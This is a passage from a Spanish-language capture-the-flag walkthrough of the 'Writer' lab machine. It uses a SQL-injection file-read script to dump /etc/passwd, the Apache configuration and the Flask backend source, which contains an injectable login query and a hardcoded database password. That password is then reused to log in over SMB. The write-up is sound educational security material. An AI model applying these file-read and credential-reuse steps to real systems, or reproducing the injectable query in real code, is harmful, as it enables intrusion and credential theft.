</span></span><span style=display:flex><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span style=display:flex><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
</span></span><span style=display:flex><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
</span></span><span style=display:flex><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
</span></span><span style=display:flex><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style=display:flex><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
</span></span><span style=display:flex><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
</span></span><span style=display:flex><span>postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
</span></span><span style=display:flex><span>filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
</span></span><span style=display:flex><span>john:x:1001:1001:,,,:/home/john:/bin/bash
</span></span><span style=display:flex><span>mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
</span></span></code></pre></div><p>Podemos continuar enumerando archivos del servidor. Sería increíble si pudiéramos leer el código fuente del <em>back-end</em>. Para ello, primero podemos buscar la configuración del servidor (normalmente un Apache o nginx).</p><p>De hecho, el archivo <code>/etc/apache2/sites-available/000-default.conf</code> existe y se muestra a continuación:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 sqli.py /etc/apache2/sites-available/000-default.conf
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#75715e># Virtual host configuration for writer.htb domain</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;VirtualHost</span> <span style=color:#e6db74>*:80</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>        ServerName writer.htb
</span></span><span style=display:flex><span>        ServerAdmin admin@writer.htb
</span></span><span style=display:flex><span>        WSGIScriptAlias / <span style=color:#e6db74>/var/www/writer.htb/writer.wsgi</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Directory</span> <span style=color:#e6db74>/var/www/writer.htb</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>                Order allow,deny
</span></span><span style=display:flex><span>                Allow from <span style=color:#66d9ef>all</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/Directory&gt;</span>
</span></span><span style=display:flex><span>        Alias <span style=color:#e6db74>/static</span> <span style=color:#e6db74>/var/www/writer.htb/writer/static</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;Directory</span> <span style=color:#e6db74>/var/www/writer.htb/writer/static/</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>                Order allow,deny
</span></span><span style=display:flex><span>                Allow from <span style=color:#66d9ef>all</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/Directory&gt;</span>
</span></span><span style=display:flex><span>        ErrorLog ${APACHE_LOG_DIR}/error.log
</span></span><span style=display:flex><span>        LogLevel <span style=color:#66d9ef>warn</span>
</span></span><span style=display:flex><span>        CustomLog ${APACHE_LOG_DIR}/access.log combined
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/VirtualHost&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Virtual host configuration for dev.writer.htb subdomain</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Will enable configuration after completing backend development</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Listen 8080</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#&lt;VirtualHost 127.0.0.1:8080&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       ServerName dev.writer.htb</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       ServerAdmin admin@writer.htb</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># Collect static for the writer2_project/writer_web/templates</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       Alias /static /var/www/writer2_project/static</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       &lt;Directory /var/www/writer2_project/static&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#               Require all granted</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       &lt;/Directory&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       &lt;Directory /var/www/writer2_project/writerv2&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#               &lt;Files wsgi.py&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#                       Require all granted</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#               &lt;/Files&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       &lt;/Directory&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       WSGIProcessGroup writer2_project</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        ErrorLog ${APACHE_LOG_DIR}/error.log</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        LogLevel warn</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#        CustomLog ${APACHE_LOG_DIR}/access.log combined</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#&lt;/VirtualHost&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
</span></span></code></pre></div><h2 id=análisis-del-código-python>Análisis del código Python</h2><p>La previa configuración de Apache apunta a un <em>script</em> principal del servidor que está en ejecución, que es <code>/var/www/writer.htb/writer.wsgi</code>, un archivo común para configurar una aplicación de Flask (que es un conocido <em>framework</em> web hecho en Python):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 sqli.py /var/www/writer.htb/writer.wsgi
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> logging
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Define logging</span>
</span></span><span style=display:flex><span>logging<span style=color:#f92672>.</span>basicConfig(stream<span style=color:#f92672>=</span>sys<span style=color:#f92672>.</span>stderr)
</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>insert(<span style=color:#ae81ff>0</span>,<span style=color:#e6db74>&#34;/var/www/writer.htb/&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Import the __init__.py from the app folder</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> writer <span style=color:#f92672>import</span> app <span style=color:#66d9ef>as</span> application
</span></span><span style=display:flex><span>application<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;SECRET_KEY&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
</span></span></code></pre></div><p>Este <em>script</em> de Python está importando otro desde <code>writer</code>. Python utiliza nombres de archivos especiales a la hora de importar módulos. Básicamente, el <em>script</em> que está importando es <code>/var/www/writer.htb/writer/__init__.py</code>. Se trata de un archivo extremadamente largo que contiene toda la funcionalidad del <em>back-end</em> (será necesario esperar más de 20 minutos para extraer el archivo completo). A continuación se muestra el código en cuestión, con algunos métodos recortados:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 sqli.py /var/www/writer.htb/writer/__init__.py
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, session, redirect, url_for, request, render_template
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> mysql.connector <span style=color:#f92672>import</span> errorcode
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> mysql.connector
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib.request
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> PIL
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> PIL <span style=color:#f92672>import</span> Image, UnidentifiedImageError
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__,static_url_path<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>,static_folder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;static&#39;</span>,template_folder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;templates&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define connection for database</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>connections</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        connector <span style=color:#f92672>=</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>connect(user<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span>, password<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ToughPasswordToCrack&#39;</span>, host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, database<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;writer&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> connector
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> err<span style=color:#f92672>.</span>errno <span style=color:#f92672>==</span> errorcode<span style=color:#f92672>.</span>ER_ACCESS_DENIED_ERROR:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Something is wrong with your db user name or password!&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> err<span style=color:#f92672>.</span>errno <span style=color:#f92672>==</span> errorcode<span style=color:#f92672>.</span>ER_BAD_DB_ERROR:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database does not exist&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Another exception, returning!&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print (<span style=color:#e6db74>&#39;Connection to DB is ready!&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define homepage</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home_page</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        connector <span style=color:#f92672>=</span> connections()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
</span></span><span style=display:flex><span>    cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
</span></span><span style=display:flex><span>    sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM stories;&#34;</span>
</span></span><span style=display:flex><span>    cursor<span style=color:#f92672>.</span>execute(sql_command)
</span></span><span style=display:flex><span>    results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/blog.html&#39;</span>, results<span style=color:#f92672>=</span>results)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define about page</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/about&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>about</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/about.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define contact page</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/contact&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>contact</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/contact.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define blog posts</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/blog/post/&lt;id&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>blog_post</span>(id):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        connector <span style=color:#f92672>=</span> connections()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
</span></span><span style=display:flex><span>    cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
</span></span><span style=display:flex><span>    cursor<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#34;SELECT * FROM stories WHERE id = </span><span style=color:#e6db74>%(id)s</span><span style=color:#e6db74>;&#34;</span>, {<span style=color:#e6db74>&#39;id&#39;</span>: id})
</span></span><span style=display:flex><span>    results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
</span></span><span style=display:flex><span>    sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM stories;&#34;</span>
</span></span><span style=display:flex><span>    cursor<span style=color:#f92672>.</span>execute(sql_command)
</span></span><span style=display:flex><span>    stories <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/blog-single.html&#39;</span>, results<span style=color:#f92672>=</span>results, stories<span style=color:#f92672>=</span>stories)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define dashboard for authenticated users</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>dashboard</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;dashboard.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define stories page for dashboard and edit/delete pages</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>stories</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        connector <span style=color:#f92672>=</span> connections()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
</span></span><span style=display:flex><span>    cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
</span></span><span style=display:flex><span>    sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Select * From stories;&#34;</span>
</span></span><span style=display:flex><span>    cursor<span style=color:#f92672>.</span>execute(sql_command)
</span></span><span style=display:flex><span>    results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;stories.html&#39;</span>, results<span style=color:#f92672>=</span>results)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories/add&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add_story</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories/edit/&lt;id&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>edit_story</span>(id):
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories/delete/&lt;id&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>delete_story</span>(id):
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define user page for dashboard</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/users&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>users</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define settings page</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/settings&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>settings</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#Define authentication mechanism</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/administrative&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login_page</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/dashboard&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
</span></span><span style=display:flex><span>        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;uname&#39;</span>)
</span></span><span style=display:flex><span>        password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>)
</span></span><span style=display:flex><span>        password <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(password<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            connector <span style=color:#f92672>=</span> connections()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
</span></span><span style=display:flex><span>            sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Select * From users Where username = &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; And password = &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;&#34;</span> <span style=color:#f92672>%</span> (username, password)
</span></span><span style=display:flex><span>            cursor<span style=color:#f92672>.</span>execute(sql_command)
</span></span><span style=display:flex><span>            results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> result <span style=color:#f92672>in</span> results:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;Got result&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> result <span style=color:#f92672>and</span> len(result) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                session[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> username
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;success.html&#39;</span>, results<span style=color:#f92672>=</span>results)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Incorrect credentials supplied&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>, error<span style=color:#f92672>=</span>error)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>            error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Incorrect credentials supplied&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>, error<span style=color:#f92672>=</span>error)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#34;/logout&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>logout</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>    session<span style=color:#f92672>.</span>pop(<span style=color:#e6db74>&#39;user&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>   app<span style=color:#f92672>.</span>run(<span style=color:#e6db74>&#34;0.0.0.0&#34;</span>)
</span></span></code></pre></div><p>Este gran <em>script</em> contiene la siguiente contraseña: <code>ToughPasswordToCrack</code>.</p><h2 id=enumeración-por-smb>Enumeración por SMB</h2><p>A primera vista, tenemos la contraseña para conectarnos a MySQL (<code>ToughPasswordToCrack</code>) como usuario <code>writer</code>. Sin embargo, esta contraseña se reutiliza en SMB para el usuario <code>kyle</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ smbmap -H 10.10.11.101 -u kyle -p ToughPasswordToCrack
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] IP: 10.10.11.101:445        Name: 10.10.11.101              Status: Authenticated
</span></span><span style=display:flex><span>        Disk                                                    Permissions     Comment
</span></span><span style=display:flex><span>        ----                                                    -----------     -------
</span></span><span style=display:flex><span>        print$                                                  READ ONLY       Printer Drivers
</span></span><span style=display:flex><span>        writer2_project                                         READ, WRITE
</span></span><span style=display:flex><span>        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
</span></span></code></pre></div><p>Como <code>kyle</code>, podemos leer y escribir archivos en <code>writer2_project</code>. Descarguemos todos los ficheros:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ smbclient -U kyle //10.10.11.101/writer2_project
</span></span><span style=display:flex><span>Enter WORKGROUP\kyle&#39;s password:
</span></span><span style=display:flex><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style=display:flex><span>smb: \&gt; dir
</span></span><span style=display:flex><span>  .                                   D        0  Mon Aug  2 19:46:12 2021
